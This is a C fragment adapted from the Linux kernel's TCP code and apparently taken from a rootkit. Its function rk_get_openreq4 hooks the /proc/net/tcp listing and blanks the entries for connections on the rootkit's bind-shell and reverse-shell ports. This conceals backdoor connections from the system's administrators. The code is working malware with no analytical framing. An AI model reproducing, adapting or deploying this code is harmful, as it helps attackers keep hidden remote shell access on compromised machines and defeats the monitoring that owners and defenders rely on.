/* modified from original linux kernel source code at /usr/src/linux/net/ipv4/tcp_ipv4.c */

#if (LINUX_VERSION_CODE < KERNEL_VERSION(3,11,0))
static void rk_get_openreq4(const struct sock *sk, const struct request_sock *req, struct seq_file *f, int i, kuid_t uid, int *len)
{
	const struct inet_request_sock *ireq = inet_rsk(req);
	long delta = req->expires - jiffies;
	char rkport[12];
	char rkport2[12];
	char inet_sport[12];
	char rmt_port[12];
	int _hook;

	sprintf(rkport, "%04X", bind_port);
	sprintf(rkport2, "%04X", reverse_shell_port);
	sprintf(inet_sport, "%04X", ntohs(inet_sk(sk)->inet_sport));
	/* 	
	#if(LINUX_VERSION_CODE >= KERNEL_VERSION(3,13,0))
	sprintf(rmt_port, "%04X", ntohs(ireq->ir_rmt_port));
	#else
	*/		
	sprintf(rmt_port, "%04X", ntohs(ireq->rmt_port));
	/*	
	#endif
	*/
	if ((strcmp(inet_sport, rkport) != 0) && (strcmp(rmt_port, rkport) != 0) && (strcmp(inet_sport, rkport2) != 0) && (strcmp(rmt_port, rkport2) != 0)) 
		_hook = 0;
	else
		_hook = 1;
	if (_hook == 0) 
		seq_printf(f, "%4d: %08X:%04X %08X:%04X"
		" %02X %08X:%08X %02X:%08lX %08X %5u %8d %u %d %pK%n",
		i,
		ireq->loc_addr,
		ntohs(inet_sk(sk)->inet_sport),
		ireq->rmt_addr,
		ntohs(ireq->rmt_port),
		TCP_SYN_RECV,
		0, 0, /* could print option size, but that is af dependent. */
		1,    /* timers active (only the expire timer) */
		jiffies_delta_to_clock_t(delta),
		req->num_timeout,
		from_kuid_munged(seq_user_ns(f), uid),
		0,  /* non standard timer */
		0, /* open_requests have no inode */
		atomic_read(&sk->sk_refcnt),
		req,
		len);
		/* #endif */
	else
		seq_printf(f, "%4d: %08X:%04X %08X:%04X"
		" %02X %08X:%08X %02X:%08lX %08X %5u %8d %u %d %pK%n",
		i,
		0,
		ntohs(0),
		0,
		ntohs(0),
		TCP_SYN_RECV,
		0, 0, /* could print option size, but that is af dependent. */
		1,    /* timers active (only the expire timer) */
		jiffies_delta_to_clock_t(delta),
		req->num_timeout,
		from_kuid_munged(seq_user_ns(f), uid),
		0,  /* non standard timer */
		0, /* open_requests have no inode */
		atomic_read(&sk->sk_refcnt),
		req,
		len);
	
}
#endif

